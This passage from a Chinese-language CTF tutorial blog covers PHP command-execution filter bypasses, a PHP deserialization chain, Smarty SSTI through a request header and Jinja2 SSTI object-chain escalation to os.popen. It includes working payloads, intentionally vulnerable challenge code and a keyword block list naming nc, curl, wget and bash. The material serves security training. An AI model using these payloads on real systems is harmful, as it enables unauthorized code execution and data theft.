function_ invoke__">str_split</span>(<span class="string">&#x27;$&#123;#&#125;\\(&lt;)\&#x27;0&#x27;</span>); </span><br><span class="line">    <span class="variable">$char_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$test</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$char_list</span> <span class="keyword">as</span> <span class="variable">$c</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$c</span>,<span class="variable">$white_list</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Cyzcc&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$test</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://probiusofficial.github.io/bashFuck/">BashFuck Payload Generator</a></p>
<h4 id="写文件到其他地方"><a href="#写文件到其他地方" class="headerlink" title="写文件到其他地方"></a>写文件到其他地方</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]R!!!C!!!E!!!">BUUCTF在线评测</a> R!!!C!!!E!!!</p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;ls / | t&#x27;&#x27;ee b&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span>= <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>(); <span class="comment">//调用两次</span></span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后直接访问b即可</p>
<p>也可以尝试下面这个方法：</p>
<p><a target="_blank" rel="noopener" href="https://kinsey973.github.io/2025/02/20/NewStarCTF-2023-公开赛道-R-C-E/">[NewStarCTF 2023 公开赛道]R!!!C!!!E!!! | 北歌</a></p>
<p>由于使用了exec，程序不会有回显，但是没有过滤sed，我们可以把正则里的|删去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> minipop;</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka = <span class="keyword">new</span> minipop;</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka-&gt;code = <span class="string">&#x27;sed -i \&#x27;s/|//g\&#x27; index`echo -e &quot;\x2ep&quot;`hp&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka-&gt;code = <span class="string">&#x27;ls / &gt;1.php&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka-&gt;code = <span class="string">&#x27;cat /flag_is_h3eeere &gt;1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
<p> <strong><code>echo -e &quot;\x2ep&quot;</code></strong></p>
<ul>
<li><code>\x2e</code> 是十六进制，代表字符 <code>.</code></li>
<li><code>\x70</code> 是十六进制，代表字符 <code>p</code></li>
<li>所以 <code>echo -e &quot;\x2ep&quot;</code> 输出就是 <code>.p</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index`<span class="built_in">echo</span> -e <span class="string">&quot;\x2ep&quot;</span>`hp</span><br></pre></td></tr></table></figure>
<ul>
<li>反引号会执行命令并替换结果</li>
<li>最终拼接成：<code>index.php</code></li>
</ul>
<p><strong>sed 命令</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/|//g&#x27;</span> index.php</span><br></pre></td></tr></table></figure>
<ul>
<li><code>-i</code>：直接修改文件（不备份）</li>
<li><code>&#39;s/|//g&#39;</code>：把文件中所有的 <code>|</code> 字符<strong>删除</strong></li>
</ul>
<h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><h4 id="BUUCTF在线评测-禁止套娃"><a href="#BUUCTF在线评测-禁止套娃" class="headerlink" title="BUUCTF在线评测 禁止套娃"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GXYCTF2019]禁止套娃">BUUCTF在线评测</a> 禁止套娃</h4><p>跳过前面运用GitHack的部分，直接看RCE部分</p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>Padyload：</strong></p>
<p>用 <strong>current(localeconv())</strong> 来代替了 <code>.</code> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为hexo的关系，这里不在代码块外的&#123;&#123;&#125;&#125;统一换成&#123;&#123;...&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>模板引擎：（这里特指用于Web开发的模板引擎）</p>
<p>是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前</p>
<p><strong>SSTI(Server-Side Template Injection)：服务器端模板注入</strong></p>
<p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题</p>
<h3 id="Smarty-SSTI"><a href="#Smarty-SSTI" class="headerlink" title="Smarty SSTI"></a>Smarty SSTI</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019 华东南赛区]Web11">BUUCTF在线评测</a></p>
<p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如<code>*||*,or,&amp;&amp;,and,is_array(),</code>等等</p>
<p>既然全部的PHP条件表达式和函数都可以在if内使用,那我们在里面写php代码也行。<br><code>&#123;if phpinfo()&#125;&#123;/if&#125;</code></p>
<p>payload:</p>
<p><code>X-Forwarded-For:&#123;if system(&#39;cat /flag&#39;)&#125;&#123;/if&#125;</code></p>
<hr>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18442823">CTF web漏洞合集 Python篇（1）python中的SSTI - LamentXU - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tuzkizki/p/15394415.html">Python SSTI漏洞学习总结 - Tuzkizki - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/10/20/ssti/">SSTI模板注入 | Antel0p3’s blog</a></p>
<p>介于jinja2出现的非常多，就只看看jinja2</p>
<p><img src="/img/lazy.gif" data-original="w1.png" alt=""></p>
<p>先看这个包浆的图片（）</p>
<p>可以知道49如果回显是49（也就是执行了里面的命令）的话，就说明存在SSTI</p>
<p>然后可以再试NaN，如果还是49就可以下判断了，但是一般题目就是前一步可以直接下结论是jinja2内部存在的SSTI</p>
<p><strong>那么什么是jinja2？</strong></p>
<p>Jinja 模板只是一个文本文件，可以 基于模板生成任何基于文本的格式（HTML、XML、CSV、LaTeX 等），一般用在前端的项目中，渲染 HTML 文件</p>
<p>模板包含变量或表达式，这两者在模板求值的时候会被替换为值。模板中还有标签，控制模板的逻辑。模板语法的大量灵感来自于 Django 和 Python </p>
<p>基本语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">语句 &#123;% ... %&#125;</span><br><span class="line">变量 &#123;&#123; ... &#125;&#125;</span><br><span class="line">注释 &#123;# ... #&#125;</span><br></pre></td></tr></table></figure>
<p>常用的语句包括：for、if、set、include、block、filter 等</p>
<p>变量通过传递字典来进行使用，当使用 for 语句的时候，变量可以是列表</p>
<p>创建和渲染模板的最基本方法是通过 <code>Template</code>，通过创建一个 <code>Template</code> 的实例，<br>会得到一个新的模板对象，模板对象有一个 <code>render()</code> 的方法，该方法在调用 <code>dict</code> 或 <code>keywords</code> 参数时填充模板</p>
<p>E.g</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">eg = Template(<span class="string">&#x27;hello &#123;&#123;name&#125;&#125;&#x27;</span>)</span><br><span class="line">result = eg.render(name = <span class="string">&#x27;111&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<p>结果就是</p>
<p><code>hello 111</code> </p>
<p><strong>成因：</strong></p>
<p>欸但是一般代码中不带这个<code>&#123;&#123;...&#125;&#125;</code>，就会出现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    t = <span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello %s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> % (name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    t = Template<span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello  %s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> % (name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>再或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;please input name:&quot;</span>)  <span class="comment"># 用于模拟获取 name 参数，你可以根据实际情况获取 name 的值</span></span><br><span class="line">t = Template(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Hello  %s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % (name))</span><br><span class="line"><span class="built_in">print</span>(t.render())</span><br></pre></td></tr></table></figure>
<p>这边你正常传入一个字符串，就是正常显示的，但是当你传入一个<code>&#123;&#123;7*7&#125;&#125;</code>，结果就是会变成49，这是因为<code>&#123;&#123;...&#125;&#125;</code>被渲染到Template里了，这点在上面的jinja2语法中有所体现</p>
<p><img src="/img/lazy.gif" data-original="w2.png" alt=""></p>
<p>然后传入49</p>
<p><img src="/img/lazy.gif" data-original="w3.png" alt=""></p>
<p>那么我们知道了可以传入<code>&#123;&#123;...&#125;&#125;</code>进而被Template渲染后，我们就可以尝试干两件事：<strong>获取信息</strong>和<strong>RCE</strong></p>
<p>我们先看获取一些信息这边</p>
<p>比如查看一些什么config和env</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;		# 获取config，包含flag</span><br><span class="line">&#123;&#123;request.environ&#125;&#125;	# 获取环境信息</span><br></pre></td></tr></table></figure>
<p>给个源码方便你们也可以试试（）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;Flag&#x27;</span>] = <span class="string">&#x27;flag&#123;You_Find_Me!!!&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAG = os.getenv(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;flag&#123;here_is_a_flag!!!&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_flag_to_environ</span>():</span><br><span class="line">    request.environ[<span class="string">&#x27;FLAG&#x27;</span>] = FLAG</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">    t = <span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello %s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> % (name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
<p>然后我们直接 <code>?name=&#123;&#123;config&#125;&#125;</code></p>
<p>可以看到</p>
<p><img src="/img/lazy.gif" data-original="w4.png" alt=""></p>
<p>再看看 <code>&#123;&#123;request.environ&#125;&#125;</code></p>
<p><img src="/img/lazy.gif" data-original="w5.png" alt=""></p>
<p>如果是想进行RCE的话，那就需要os库，但是肯定不会傻到内置os库给你用的，所以就需要你自己导入一个os库，使用system或者popen这种危险函数来读取</p>
<p>然后就有思路：</p>
<ul>
<li>使用万能的对象（比如字符串对象’’）-&gt; 子类 -&gt; 基类 -&gt; 危险类的危险函数（大多数情况）</li>
<li>直接使用代码中定义的对象（包括已经导入的库）所包含的危险子类中的危险函数（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18243707">R3CTF 2024 web jinjaclub wp - LamentXU - 博客园</a>）</li>
</ul>
<p>这里说是“万能的对象”，其实大多数情况下，最好用最经典的还是字符串对象’’，当然[]这些对象也是可以的</p>
<p>python中每个对象都有个属性<code>__class__</code>，用于返回该对象所属的类。而我们要做的，就是<strong>获取到object基类</strong></p>
<p><strong>使用<code>&#39;&#39;.__class__</code>我们就完成了第一步，即，获取到一个字符串对象</strong></p>
<p><code>[]</code>和<code>&#123;&#125;</code>也可以</p>
<p><img src="/img/lazy.gif" data-original="w6.png" alt=""></p>
<p>还有：</p>
<p><code>__bases__</code>：以元组的形式返回一个类所直接继承的类</p>
<p><code>__base__</code>：以字符串形式返回一个类所直接继承的类</p>
<p><code>__mro__</code>：返回解析方法调用的顺序</p>
<p><code>__subclasses__()</code>： 是一个特殊方法，用于获取某个类的所有直接子类</p>
<p><code>__init__</code>：所有自带带类都包含init方法，便于利用他当跳板来调用globals</p>
<p><code>function.__globals__</code>：用于获取function所处空间下可使用的module、方法以及所有变量</p>
<p><code>[&#39;__builtins__&#39;]</code>：从全局变量字典中获取内置模块的引用</p>
<ul>
<li>通过 <code>__builtins__</code> 访问 <code>eval()</code> 或 <code>exec()</code> 函数来执行恶意代码</li>
<li>使用 <code>__builtins__</code> 中的 <code>open()</code> 函数来读取或写入文件</li>
<li>利用 <code>__builtins__</code> 中的 <code>__import__()</code> 函数来动态导入其他模块，比如 <code>os</code> 或 <code>sys</code>，然后执行系统命令</li>
</ul>
<p><code>__import__</code>：导入模块</p>
<p><code>__getitem__</code>：提取元素</p>
<p>比如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.__class__.__bases__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#(&lt;class &#x27;object&#x27;&gt;,)</span></span><br></pre></td></tr></table></figure>
<ol>
<li><code>&quot;&quot;</code>：创建一个空字符串</li>
<li><code>__class__</code>：访问该空字符串的类。对于字符串对象，其类是 <code>str</code></li>
<li><code>__bases__</code>：访问 <code>str</code> 类的基类。对于内置类型，<code>str</code> 类的基类是 <code>object</code></li>
</ol>
<p>这三个属于获取基类的办法。获取到object基类之后，因为这个基类的子类是这个python程序目前的所有类，所以可以直接找到我们要的os（是基类的一个子类）</p>
<p><strong>使用<code>&quot;&quot;.__class__.__bases__</code>或<code>&quot;&quot;.__class__.__mro__[1]</code>或<code>&quot;&quot;.__class__.__base__</code>我们就完成了第二步，即，获取到了object基类</strong></p>
<p>我们看这个：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__())</span><br></pre></td></tr></table></figure>
<ol>
<li>获取空字符串的类：<code>&quot;&quot;.__class__</code> 返回 <code>str</code> 类</li>
<li>获取 <code>str</code> 类的继承顺序：<code>__mro__</code> 返回一个元组，列出 <code>str</code> 类及其基类的顺序</li>
<li>获取 <code>str</code> 类的直接基类：<code>[1]</code> 取出 <code>__mro__</code> 元组中的第二个元素，即 <code>object</code> 类</li>
<li>获取 <code>object</code> 类的所有直接子类：调用 <code>__subclasses__()</code> 方法</li>
</ol>
<p>这样打印出来的结果就是object下的所有子类</p>
<p>现在我们要进行RCE的话</p>
<p>我们要做的，是找到使用os的内置类。那这可多了，这里可以fuzz出（由python环境改变而改变，可以直接bp数字爆破一下）如果没有的话，也可以找一些可以读取文件的内置类，那么 <strong>warnings.catch_warnings</strong> 类 可就成重灾区了（有很多其他的）</p>
<p>我们发现object基类的<code>__subclasses__()</code>中 <strong><type 'warnings.catch_warnings'></strong> 的索引值为138（随环境改变而改变），导入他后直接导入os并RCE即可，你去找<code>os._wrap_close</code>也可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;tac flag&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>也可以稍微拼接绕过一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>当然，你也可以找到其他调用了os的内置类，利用 <code>__init__</code> 和 <code>function.__globals__</code> 来调用内置类中os类的方法，如subprocess.popen：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>有用的python内置类有很多，这里贴一个脚本，可以直接把subclass出来的东西放data里帮你检测有用的类的索引</p>
